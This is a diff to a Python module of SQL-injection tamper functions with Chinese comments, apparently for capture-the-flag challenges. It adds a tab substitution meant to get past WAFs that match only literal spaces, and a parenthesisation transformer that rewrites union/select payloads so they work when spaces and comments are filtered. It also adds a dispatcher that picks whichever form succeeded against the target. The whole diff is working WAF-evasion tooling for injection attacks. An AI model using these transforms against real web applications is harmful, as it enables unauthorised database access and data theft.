@@ -25,6 +25,11 @@ def space2comment(sql: str) -> str:
     return "".join(parts)
 
 
+def tabify(sql: str) -> str:
+    """空格 → 水平制表符 %09（许多 WAF 只匹配字面空格）。"""
+    return sql.replace(" ", "\t")
+
+
 def comma_free(sql: str) -> str:
     """免逗号变换：substr(x,a,b)→substr(x from a for b)；limit a,b→limit a offset b。"""
     sql = re.sub(r"substr\s*\(\s*([^(),]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)",
@@ -60,9 +65,142 @@ def double_write(sql: str) -> str:
     return out
 
 
+# ---------------------------------------------------------------------------
+# 括号法（空格与 /**/ 均被过滤时）
+# ---------------------------------------------------------------------------
+
+_PAREN_KW = {
+    "select", "from", "where", "and", "or", "not", "like", "between", "in",
+    "having", "union", "on", "as", "when", "then", "else", "case", "join",
+}
+# 参数收集的停止词（limit 单独处理，不括号化）
+_STOP_KW = _PAREN_KW | {"limit", "offset", "order", "by", "group"}
+
+
+def _iter_tokens(sql: str):
+    """产出 (kind, text)：str/hex/word/sym，跳过字符串与 0x 字面量内容。"""
+    i, n = 0, len(sql)
+    while i < n:
+        ch = sql[i]
+        if ch in ("'", '"'):
+            j = i + 1
+            while j < n and sql[j] != ch:
+                j += 1
+            yield ("str", sql[i:j + 1])
+            i = j + 1
+        elif ch == "0" and sql[i:i + 2].lower() == "0x":
+            m = re.match(r"0x[0-9a-fA-F]*", sql[i:])
+            yield ("hex", m.group(0))
+            i += len(m.group(0))
+        else:
+            m = re.match(r"[A-Za-z_][A-Za-z0-9_]*", sql[i:])
+            if m:
+                yield ("word", m.group(0))
+                i += m.end()
+            else:
+                yield ("sym", ch)
+                i += 1
+
+
+def parenthesize(sql: str) -> str:
+    """空格与 /**/ 均被滤时的括号化（题解验证形式）：
+    - union select A,B,C → union(select(A),(B),(C))（多列必须逐列括号）
+    - kw arg → kw(arg)（select/from/where/and/or/like/...，任意嵌套深度）
+    - LIMIT 无法括号化，调用方应改用 tab 或游标法。
+    """
+    return _transform_tokens(list(_iter_tokens(sql)))
+
+
+def _transform_tokens(toks) -> str:
+    out, i, n = [], 0, len(toks)
+
+    def _collect_arg(pos):
+        """收集 kw 的参数 token（保持括号配对），停于下一个顶层关键字或结尾。"""
+        arg, depth = [], 0
+        while pos < n:
+            kind, text = toks[pos]
+            if depth == 0 and kind == "word" and text.lower() in _STOP_KW:
+                break
+            if kind == "sym" and text == "(":
+                depth += 1
+            elif kind == "sym" and text == ")":
+                if depth == 0:
+                    break
+                depth -= 1
+            arg.append((kind, text))
+            pos += 1
+        return arg, pos
+
+    while i < n:
+        kind, text = toks[i]
+        if kind == "sym" and text.isspace():
+            i += 1                       # paren 形态不允许任何空格残留
+            continue
+        if kind == "word" and text.lower() == "limit":
+            # LIMIT 无法括号化（limit(0,1) 语法错误），用 tab 分隔（需 %09 可用）
+            arg, i2 = _collect_arg(i + 1)
+            out.append("limit\t" + "".join(t for _, t in arg if not t.isspace()))
+            i = i2
+            continue
+        if kind == "word" and text.lower() in _PAREN_KW:
+            kw = text.lower()
+            if kw == "select":
+                # 列表：顶层逗号拆列，逐列递归变换后括号 select(a),(b),(c)
+                i += 1
+                cols, cur, depth = [], [], 0
+                while i < n:
+                    k2, t2 = toks[i]
+                    if k2 == "sym" and t2.isspace():
+                        i += 1
+                        continue
+                    if depth == 0 and k2 == "word" and t2.lower() in _STOP_KW:
+                        break
+                    if k2 == "sym" and t2 == "(":
+                        depth += 1
+                    elif k2 == "sym" and t2 == ")":
+                        if depth == 0:
+                            break
+                        depth -= 1
+                    elif k2 == "sym" and t2 == "," and depth == 0:
+                        cols.append(cur)
+                        cur = []
+                        i += 1
+                        continue
+                    cur.append((k2, t2))
+                    i += 1
+                if cur or not cols:
+                    cols.append(cur)
+                out.append("select" + ",".join(
+                    f"({_transform_tokens(c)})" for c in cols))
+            elif kw == "union":
+                out.append("union(" + _transform_tokens(toks[i + 1:]) + ")")
+                i = n
+            else:
+                arg, i2 = _collect_arg(i + 1)
+                out.append(kw + f"({_transform_tokens(arg)})" if arg else kw)
+                i = i2
+        else:
+            out.append(text)
+            i += 1
+    return "".join(out)
+
+
 TAMPERS = {
     "space2comment": space2comment,
+    "tabify": tabify,
+    "parenthesize": parenthesize,
     "comma_free": comma_free,
     "mixed_case": mixed_case,
     "double_write": double_write,
 }
+
+
+def apply_form(core: str, form: str) -> str:
+    """按实测命中的 payload 形态变换核心 SQL。"""
+    if form == "paren":
+        return parenthesize(core)
+    if form == "inline":
+        return space2comment(core)
+    if form == "tab":
+        return tabify(core)
+    return core
